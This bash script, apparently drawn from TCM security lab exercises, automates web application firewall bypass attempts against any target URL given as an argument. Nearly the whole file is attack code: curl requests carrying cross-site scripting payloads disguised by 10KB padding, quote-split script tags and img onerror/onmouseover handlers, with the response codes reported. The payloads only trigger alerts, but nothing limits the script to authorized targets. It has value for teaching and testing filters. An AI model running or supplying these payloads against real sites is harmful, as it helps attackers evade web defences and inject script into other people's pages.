#!/bin/bash
# [WITCH-HUNTER] WAF BYPASS AUTOMATOR (TCM LOGIC)
TARGET=$1

echo "--- [ WAF BYPASS AUDIT START ] ---"

# 1. PADDING BYPASS (TCM Lab 2 - 10k bytes) [00:07:13]
echo "[+] Testing 10KB Padding Bypass..."
PAYLOAD=$(printf 'A%.0s' {1..10000})"<img src=x onerror=prompt(1)>"
curl -X POST -d "data=$PAYLOAD" "$TARGET" -s -o /dev/null -w "Result: %{http_code}\n"

# 2. KEYWORD SPLITTING (TCM Lab 3 - Quote Injection) [00:09:00]
echo "[+] Testing Keyword Splitting (s'c'r'i'p't)..."
curl -X GET "$TARGET?id=<s'c'r'i'p't>alert(1)</s'c'r'i'p't>" -s -o /dev/null -w "Result: %{http_code}\n"

# 3. ATTRIBUTE PIVOT (TCM Lab 1 - Mouseover) [00:05:32]
echo "[+] Testing Attribute Pivot (onmouseover)..."
curl -X GET "$TARGET?search=<img src=x onmouseover=prompt(1)>" -s -o /dev/null -w "Result: %{http_code}\n"

echo "--- [ AUDIT COMPLETE ] ---"
